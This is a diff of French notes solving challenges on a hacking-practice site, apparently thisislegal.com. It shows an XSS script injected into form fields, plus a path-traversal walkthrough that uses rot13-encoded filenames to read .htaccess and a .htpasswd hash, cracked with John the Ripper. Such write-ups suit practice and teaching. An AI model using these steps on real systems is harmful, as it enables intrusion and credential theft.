@@ -136,6 +136,58 @@ se logguer en SuperAdmin, aller sur File Manager
 aller dans misc et supprimer targets
 aller dans images et supprimer logs
 
+
+#Realistic Challenge 3
+Aller dans l'ajout de lien. utiliser tamper data.
+dans le champ T1 : <script>alert('lol');</script>
+dans le champ T2 : <script>alert('lol');</script>
+dans le champ LinkView : 0
+
+#Realistic Challenge 4
+http://www.thisislegal.com/newr/src/read.php?customer=1
+affiche le contenu de http://www.thisislegal.com/newr/src/1
+
+http://www.thisislegal.com/newr/src/read.php?customer=toto
+```
+ Warning: fopen(gbgb) [function.fopen]: failed to open stream: No such file or directory in /home/thisi30/public_html/newr/src/read.php on line 45
+```
+toto => gbgb
+
+http://www.thisislegal.com/newr/src/read.php?customer=../abcdefghijklmnopqrstuvwxyz
+```
+ Warning: fopen(../nopqrstuvwxyzabcdefghijklm) [function.fopen]: failed to open stream: No such file or directory in /home/thisi30/public_html/newr/src/read.php on line 45
+```
+nom du fichier encodé en rot13 !
+
+affichage de la page order2.php : http://www.thisislegal.com/newr/src/read.php?customer=../beqre2.cuc
+```
+     alert('Request Submitted, thank you');location.href='index.php';"; $File = "secure/orders.db"; $fh = fopen($File, 'a'); $stringData = $_POST['name'] . "\n"; @fwrite($fh, $stringData); $stringData = $_POST['email'] . "\n"; @fwrite($fh, $stringData); $stringData = $_POST['site'] . "\n"; @fwrite($fh, $stringData); @fclose($fh); } ?> 
+```
+
+http://www.thisislegal.com/newr/secure/orders.db
+authentification http.
+
+affichage du .htaccess : http://www.thisislegal.com/newr/src/read.php?customer=../frpher/.ugnpprff
+```
+AuthName "Password Protected Area" 
+AuthType Basic 
+AuthUserFile /home/thisi30/public_html/newr/secure/.htpasswd 
+Require valid-user 
+```
+afficage de .htpasswd : http://www.thisislegal.com/newr/src/read.php?customer=../frpher/.ugcnffjq
+```
+admin:adzN92vpWgSP6 
+```
+utilisation de john the ripper
+```
+sudo john .htpasswd 
+Loaded 1 password hash (Traditional DES [128/128 BS SSE2-16])
+vimto            (admin)
+guesses: 1  time: 0:00:01:44 (3)  c/s: 1935K  trying: vim2w - vim89
+Use the "--show" option to display all of the cracked passwords reliably
+```
+aller dans http://www.thisislegal.com/newr/secure/
+
 #Bonus challenge 1
 afficher la source (CTRL+U)
 ```
@@ -161,12 +213,6 @@ else if (answer != pass)
 
 </script>
 ```
-
-#Realistic Challenge 3
-Aller dans l'ajout de lien. utiliser tamper data.
-dans le champ T1 : <script>alert('lol');</script>
-dans le champ T2 : <script>alert('lol');</script>
-dans le champ LinkView : 0
 
 #Bonus challenge 2
 le champ password est désactivé.
